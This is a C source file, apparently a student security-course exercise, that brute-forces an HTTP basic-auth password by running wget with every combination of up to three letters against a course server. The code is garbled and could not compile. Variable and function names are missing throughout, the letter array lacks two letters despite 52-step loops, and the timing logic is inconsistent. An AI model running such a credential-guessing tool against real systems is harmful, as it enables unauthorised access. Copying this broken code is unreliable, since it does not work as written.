

#include <stdio.h>
#include <string.h>
#include <sys/time.h>

#define OneBillion 1e9
#define false 0
#define true 1
int execPassword(char *, char *b) {


    char [100]={'\0'};
    strcpy(,b);
    
    strcat(,);
    printf ("Sending command %s\n",);
    if ( system()== 0) {
       printf ("\n password is : %s",);
       return 1;
    }
    return 0;
}
 

int bruteForce(char [],char comb[],char *url) {


int i,j,k;

   for(i=0;i<52 ;i++) {
        comb[0]= [i];
        if (execPassword(comb,url)== 1) return 1; 
          for(j=0;j<52;j++) {
              comb[1] = [j];
              if(execPassword(comb,url)==1) return 1;
                for(k=0;k<52;k++) {
                    comb[2] = [k];
                    if(execPassword(comb,url)==1) return 1;
                }
          comb[1] = '\0';
     }
   }
   return 0;

} 

int  (char *argc, char *argv[]) {

 int i,j,k;
 char strin[80] = {'\0'};
 char *passwd;
 char a[] = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'};
 char v[4]={'\0'};
 int startTime, stopTime, final;
 int flag=false; 
 strcpy(strin,"wget http://sec-crack.cs.rmit.edu./SEC/2/ --http-user= --http-passwd=");

  startTime = time();
    if (bruteForce(a,v,strin)==1) {
      stopTime = time();
      final = stopTime-startTime;
    }

       printf ("\n The password is : %s",v);
       printf("%lld nanoseconds (%lf) seconds \n", final,  (double)final/OneBillion );

}
